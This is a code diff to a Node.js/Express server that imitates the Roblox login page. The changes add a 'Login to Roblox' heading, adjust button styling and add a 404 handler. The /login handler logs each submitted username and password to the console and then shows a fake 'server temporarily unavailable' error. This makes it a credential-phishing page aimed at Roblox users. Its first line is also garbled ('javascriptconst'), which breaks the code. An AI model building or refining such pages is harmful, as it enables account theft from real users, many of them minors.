@@ -1,4 +1,4 @@
-const express = require('express');
+javascriptconst express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -20,7 +20,7 @@ app.get('/', (req, res) => {
         .btn-submit { width: 100%; padding: 12px; background-color: transparent; border: 1px solid #ffffff; border-radius: 6px; color: #ffffff; font-size: 16px; font-weight: 500; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s; }
         .btn-submit:hover { background-color: rgba(255, 255, 255, 0.1); }
         .secondary-actions { border-top: 1px solid #3f434a; padding-top: 20px; margin-top: 20px; }
-        .btn-secondary { width: 100%; padding: 12px; background-color: #383b40; border: none; border-radius: 6px; color: #ffffff; font-size: 15px; cursor: pointer; margin-bottom: 10px; }
+        .btn-secondary { width: 100%; padding: 12px; background-color: #383b40; border: none; border-radius: 6px; color: #ffffff; font-size: 15px; cursor: pointer; margin-bottom: 10px; text-align: center; }
         .btn-secondary:hover { background-color: #43474d; }
         .link-text { display: block; text-align: center; color: #ffffff; font-size: 14px; text-decoration: none; margin: 15px 0; }
         .link-text:hover { text-decoration: underline; }
@@ -28,6 +28,9 @@ app.get('/', (req, res) => {
 </head>
 <body>
 <div class="auth-container">
+    <h2 style="color: #ffffff; text-align: center; margin-top: 0; margin-bottom: 25px; font-size: 24px; font-weight: 600;">
+        Login to Roblox
+    </h2>
     <form action="/login" method="POST">
         <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
         <input type="password" name="password" class="input-control" placeholder="Password" required>
@@ -35,8 +38,8 @@ app.get('/', (req, res) => {
     </form>
     <a href="#" class="link-text">Forgot Password or Username?</a>
     <div class="secondary-actions">
-        <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
-        <button type="button" class="btn-secondary">Quick Sign-in</button>
+        <div class="btn-secondary">Email Me a One-Time Code</div>
+        <div class="btn-secondary">Quick Sign-in</div>
     </div>
     <a href="#" class="link-text" style="margin-top: 20px;">Don't have an account? Sign Up</a>
 </div>
@@ -48,6 +51,10 @@ app.get('/', (req, res) => {
 app.post('/login', (req, res) => {
     console.log(`[СЕРВЕР] Данные получены! Логин: ${req.body.username}, Пароль: ${req.body.password}`);
     res.status(503).send('Сервер временно недоступен.');
+});
+
+app.use((req, res) => {
+    res.status(404).send('Страница не найдена');
 });
 
 app.listen(PORT, () => {
